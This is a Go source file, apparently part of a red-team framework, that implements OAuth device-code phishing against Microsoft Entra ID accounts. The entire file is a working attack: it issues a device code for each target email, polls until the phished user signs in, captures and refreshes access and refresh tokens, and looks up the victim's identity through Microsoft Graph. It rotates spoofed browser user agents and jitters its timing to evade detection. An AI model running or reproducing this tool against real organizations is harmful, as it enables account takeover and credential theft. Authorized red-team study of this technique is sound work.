// Package devicecode implements the Microsoft Entra ID Device Authorization Grant
// phishing technique for authorized red team assessments.
//
// This abuses the OAuth2 Device Code flow (RFC 8628) where the operator obtains
// a device_code per target, delivers the user_code via phishing, and polls for
// token redemption. When the target authenticates, the token is correlated back
// to their identity via the unique device_code.
//
// Reference: https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code
// Reference: https://github.com/f-bader/TokenTacticsV2
package devicecode

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

const (
	deviceAuthURL = "https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode"
	tokenURL      = "https://login.microsoftonline.com/%s/oauth2/v2.0/token"
)

// userAgents is a pool of realistic Windows browser user agents used to avoid
// fingerprinting via Go's default "Go-http-client/1.x" header.
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.133",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
}

func pickUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

// jitterDuration returns d ± up to 30% random jitter.
func jitterDuration(d time.Duration) time.Duration {
	jitter := time.Duration(rand.Int63n(int64(d * 30 / 100)))
	if rand.Intn(2) == 0 {
		return d + jitter
	}
	return d - jitter
}

// DeviceCodeResponse is what Microsoft returns when we initiate a device flow
type DeviceCodeResponse struct {
	DeviceCode      string `json:"device_code"`
	UserCode        string `json:"user_code"`
	VerificationURI string `json:"verification_uri"`
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
	Message         string `json:"message"`

	// Internal tracking
	TargetID    string    `json:"target_id"`
	TargetEmail string    `json:"target_email"`
	IssuedAt    time.Time `json:"issued_at"`
	ExpiresAt   time.Time `json:"expires_at"`
}

// TokenResult holds the redeemed tokens
type TokenResult struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`

	// Correlation metadata
	TargetID          string    `json:"target_id"`
	TargetEmail       string    `json:"target_email"`
	RedeemedAt        time.Time `json:"redeemed_at"`
	UserPrincipalName string    `json:"upn,omitempty"`

	// Extracted from JWT claims at capture time
	TenantID         string `json:"tenant_id,omitempty"`
	CapturedClientID string `json:"captured_client_id,omitempty"`
}

// jwtClaims holds the subset of JWT claims we care about.
type jwtClaims struct {
	TenantID string `json:"tid"`
	AppID    string `json:"appid"` // v1 tokens
	AZP      string `json:"azp"`   // v2 tokens (authorized party)
	OID      string `json:"oid"`
	UPN      string `json:"upn"`
	UniqName string `json:"unique_name"`
}

// extractJWTClaims parses the payload of a JWT (no signature verification —
// we only need metadata we trust because it came from our own capture).
func extractJWTClaims(token string) (jwtClaims, error) {
	parts := strings.SplitN(token, ".", 3)
	if len(parts) != 3 {
		return jwtClaims{}, fmt.Errorf("not a JWT")
	}
	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return jwtClaims{}, fmt.Errorf("decoding JWT payload: %w", err)
	}
	var c jwtClaims
	json.Unmarshal(payload, &c)
	return c, nil
}

// PollError types from Microsoft
type pollError struct {
	Error            string `json:"error"`
	ErrorDescription string `json:"error_description"`
}

// SessionState tracks the state of a single device code session
type SessionState int

const (
	StateInitializing SessionState = iota
	StatePending      // user_code delivered, waiting for auth
	StateCompleted    // token received
	StateExpired
	StateError
	StateCancelled
)

func (s SessionState) String() string {
	switch s {
	case StateInitializing:
		return "initializing"
	case StatePending:
		return "pending"
	case StateCompleted:
		return "completed"
	case StateExpired:
		return "expired"
	case StateError:
		return "error"
	case StateCancelled:
		return "cancelled"
	default:
		return "unknown"
	}
}

// Session tracks one device code flow for one target
type Session struct {
	mu         sync.RWMutex
	DeviceCode *DeviceCodeResponse
	Result     *TokenResult
	State      SessionState
	ErrorMsg   string
	LastPolled time.Time
	PollCount  int
}

func (s *Session) GetState() SessionState {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.State
}

func (s *Session) GetResult() *TokenResult {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.Result
}

// Engine manages all device code sessions for a campaign.
// Each engine instance picks a single user agent at creation time so all
// requests within one campaign appear to come from the same browser.
type Engine struct {
	mu       sync.RWMutex
	sessions map[string]*Session // keyed by target ID

	tenantID  string
	clientID  string
	scope     string
	interval  time.Duration
	userAgent string // fixed for this engine instance

	// Channel for completed sessions
	Results chan *TokenResult

	httpClient *http.Client
}

func NewEngine(tenantID, clientID, scope string, pollIntervalSec int) *Engine {
	interval := time.Duration(pollIntervalSec) * time.Second
	if interval < 5*time.Second {
		interval = 5 * time.Second // Microsoft minimum
	}
	return &Engine{
		sessions:   make(map[string]*Session),
		tenantID:   tenantID,
		clientID:   clientID,
		scope:      scope,
		interval:   interval,
		userAgent:  pickUA(),
		Results:    make(chan *TokenResult, 256),
		httpClient: &http.Client{Timeout: 30 * time.Second},
	}
}

// newRequest creates an http.Request with the engine's spoofed User-Agent.
func (e *Engine) newRequest(ctx context.Context, method, url string, body io.Reader) (*http.Request, error) {
	req, err := http.NewRequestWithContext(ctx, method, url, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", e.userAgent)
	return req, nil
}

// RequestDeviceCode initiates a device code flow for one target.
func (e *Engine) RequestDeviceCode(ctx context.Context, targetID, targetEmail string) (*DeviceCodeResponse, error) {
	authURL := fmt.Sprintf(deviceAuthURL, e.tenantID)

	form := url.Values{}
	form.Set("client_id", e.clientID)
	form.Set("scope", e.scope)

	req, err := e.newRequest(ctx, "POST", authURL, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, fmt.Errorf("building request: %w", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := e.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("device code request failed: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("device code endpoint returned %d: %s", resp.StatusCode, string(body))
	}

	var dcr DeviceCodeResponse
	if err := json.Unmarshal(body, &dcr); err != nil {
		return nil, fmt.Errorf("parsing device code response: %w", err)
	}

	dcr.TargetID = targetID
	dcr.TargetEmail = targetEmail
	dcr.IssuedAt = time.Now().UTC()
	dcr.ExpiresAt = dcr.IssuedAt.Add(time.Duration(dcr.ExpiresIn) * time.Second)

	session := &Session{
		DeviceCode: &dcr,
		State:      StatePending,
	}
	e.mu.Lock()
	e.sessions[targetID] = session
	e.mu.Unlock()

	return &dcr, nil
}

// StartPolling begins polling the token endpoint for a specific target's device code.
// Each poll interval is jittered ±30% to avoid uniform traffic fingerprinting.
func (e *Engine) StartPolling(ctx context.Context, targetID string) {
	e.mu.RLock()
	session, ok := e.sessions[targetID]
	e.mu.RUnlock()
	if !ok {
		return
	}

	go func() {
		for {
			// Jittered sleep instead of a fixed ticker — avoids all goroutines
			// waking and firing requests at the exact same cadence.
			sleep := jitterDuration(e.interval)
			select {
			case <-ctx.Done():
				session.mu.Lock()
				session.State = StateCancelled
				session.mu.Unlock()
				return
			case <-time.After(sleep):
			}

			if time.Now().After(session.DeviceCode.ExpiresAt) {
				session.mu.Lock()
				session.State = StateExpired
				session.mu.Unlock()
				return
			}

			result, done, err := e.poll(ctx, session)
			session.mu.Lock()
			session.LastPolled = time.Now().UTC()
			session.PollCount++
			session.mu.Unlock()

			if err != nil {
				session.mu.Lock()
				session.State = StateError
				session.ErrorMsg = err.Error()
				session.mu.Unlock()
				return
			}

			if done && result != nil {
				e.resolveUPN(ctx, result)

				session.mu.Lock()
				session.State = StateCompleted
				session.Result = result
				session.mu.Unlock()

				select {
				case e.Results <- result:
				default:
				}
				return
			}
		}
	}()
}

func (e *Engine) poll(ctx context.Context, session *Session) (*TokenResult, bool, error) {
	tokenEndpoint := fmt.Sprintf(tokenURL, e.tenantID)

	form := url.Values{}
	form.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
	form.Set("client_id", e.clientID)
	form.Set("device_code", session.DeviceCode.DeviceCode)

	req, err := e.newRequest(ctx, "POST", tokenEndpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := e.httpClient.Do(req)
	if err != nil {
		return nil, false, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode == 200 {
		var token TokenResult
		if err := json.Unmarshal(body, &token); err != nil {
			return nil, false, fmt.Errorf("parsing token: %w", err)
		}
		token.TargetID = session.DeviceCode.TargetID
		token.TargetEmail = session.DeviceCode.TargetEmail
		token.RedeemedAt = time.Now().UTC()
		if claims, err := extractJWTClaims(token.AccessToken); err == nil {
			token.TenantID = claims.TenantID
			if claims.AppID != "" {
				token.CapturedClientID = claims.AppID
			} else {
				token.CapturedClientID = claims.AZP
			}
		}
		return &token, true, nil
	}

	var pollErr pollError
	json.Unmarshal(body, &pollErr)
	switch pollErr.Error {
	case "authorization_pending":
		return nil, false, nil
	case "slow_down":
		// Microsoft is asking us to back off — add extra jitter on top
		time.Sleep(jitterDuration(10 * time.Second))
		return nil, false, nil
	case "authorization_declined":
		return nil, true, fmt.Errorf("target declined authorization")
	case "expired_token":
		return nil, true, fmt.Errorf("device code expired")
	default:
		return nil, true, fmt.Errorf("poll error: %s - %s", pollErr.Error, pollErr.ErrorDescription)
	}
}

// resolveUPN calls Microsoft Graph /me to get the UPN from the access token.
func (e *Engine) resolveUPN(ctx context.Context, result *TokenResult) {
	req, err := e.newRequest(ctx, "GET", "https://graph.microsoft.com/v1.0/me", nil)
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+result.AccessToken)

	resp, err := e.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	var me struct {
		UPN         string `json:"userPrincipalName"`
		DisplayName string `json:"displayName"`
		Mail        string `json:"mail"`
	}
	body, _ := io.ReadAll(resp.Body)
	if json.Unmarshal(body, &me) == nil {
		result.UserPrincipalName = me.UPN
	}
}

// RefreshAccessToken exchanges a refresh_token for a new access_token using
// the standard OAuth2 token endpoint. The returned TokenResult contains the new
// tokens; if the server does not return a new refresh_token the caller should
// preserve the original.
func RefreshAccessToken(ctx context.Context, tenantID, clientID, refreshToken, scope string) (*TokenResult, error) {
	endpoint := fmt.Sprintf(tokenURL, tenantID)
	form := url.Values{}
	form.Set("grant_type", "refresh_token")
	form.Set("client_id", clientID)
	form.Set("refresh_token", refreshToken)
	if scope != "" {
		form.Set("scope", scope)
	}

	req, err := http.NewRequestWithContext(ctx, "POST", endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", pickUA())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("refresh request failed: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		var pe pollError
		json.Unmarshal(body, &pe)
		return nil, fmt.Errorf("refresh_token exchange failed: %s — %s", pe.Error, pe.ErrorDescription)
	}

	var token TokenResult
	if err := json.Unmarshal(body, &token); err != nil {
		return nil, fmt.Errorf("parsing token response: %w", err)
	}
	token.RedeemedAt = time.Now().UTC()
	return &token, nil
}

// AllSessions returns a snapshot of all sessions
func (e *Engine) AllSessions() map[string]*SessionSnapshot {
	e.mu.RLock()
	defer e.mu.RUnlock()

	out := make(map[string]*SessionSnapshot, len(e.sessions))
	for id, sess := range e.sessions {
		sess.mu.RLock()
		snap := &SessionSnapshot{
			TargetID:        id,
			TargetEmail:     sess.DeviceCode.TargetEmail,
			UserCode:        sess.DeviceCode.UserCode,
			VerificationURI: sess.DeviceCode.VerificationURI,
			State:           sess.State,
			IssuedAt:        sess.DeviceCode.IssuedAt,
			ExpiresAt:       sess.DeviceCode.ExpiresAt,
			LastPolled:      sess.LastPolled,
			PollCount:       sess.PollCount,
			ErrorMsg:        sess.ErrorMsg,
		}
		if sess.Result != nil {
			snap.RedeemedAt = sess.Result.RedeemedAt
			snap.UPN = sess.Result.UserPrincipalName
		}
		sess.mu.RUnlock()
		out[id] = snap
	}
	return out
}

// GetSession returns a snapshot of a specific session
func (e *Engine) GetSession(targetID string) (*SessionSnapshot, bool) {
	e.mu.RLock()
	sess, ok := e.sessions[targetID]
	e.mu.RUnlock()
	if !ok {
		return nil, false
	}

	sess.mu.RLock()
	defer sess.mu.RUnlock()
	snap := &SessionSnapshot{
		TargetID:        targetID,
		TargetEmail:     sess.DeviceCode.TargetEmail,
		UserCode:        sess.DeviceCode.UserCode,
		VerificationURI: sess.DeviceCode.VerificationURI,
		State:           sess.State,
		IssuedAt:        sess.DeviceCode.IssuedAt,
		ExpiresAt:       sess.DeviceCode.ExpiresAt,
		LastPolled:      sess.LastPolled,
		PollCount:       sess.PollCount,
		ErrorMsg:        sess.ErrorMsg,
	}
	if sess.Result != nil {
		snap.RedeemedAt = sess.Result.RedeemedAt
		snap.UPN = sess.Result.UserPrincipalName
	}
	return snap, true
}

// CancelSession cancels polling for a specific target
func (e *Engine) CancelSession(targetID string) {
	e.mu.Lock()
	sess, ok := e.sessions[targetID]
	e.mu.Unlock()
	if !ok {
		return
	}
	sess.mu.Lock()
	sess.State = StateCancelled
	sess.mu.Unlock()
}

// SessionSnapshot is a point-in-time view of a session (safe to return over API)
type SessionSnapshot struct {
	TargetID        string       `json:"target_id"`
	TargetEmail     string       `json:"target_email"`
	UserCode        string       `json:"user_code"`
	VerificationURI string       `json:"verification_uri"`
	State           SessionState `json:"state"`
	StateStr        string       `json:"state_str"`
	IssuedAt        time.Time    `json:"issued_at"`
	ExpiresAt       time.Time    `json:"expires_at"`
	LastPolled      time.Time    `json:"last_polled"`
	PollCount       int          `json:"poll_count"`
	ErrorMsg        string       `json:"error_msg,omitempty"`
	RedeemedAt      time.Time    `json:"redeemed_at,omitempty"`
	UPN             string       `json:"upn,omitempty"`
}

func (s *SessionSnapshot) MarshalJSON() ([]byte, error) {
	type Alias SessionSnapshot
	return json.Marshal(&struct {
		*Alias
		StateStr string `json:"state_str"`
	}{
		Alias:    (*Alias)(s),
		StateStr: s.State.String(),
	})
}
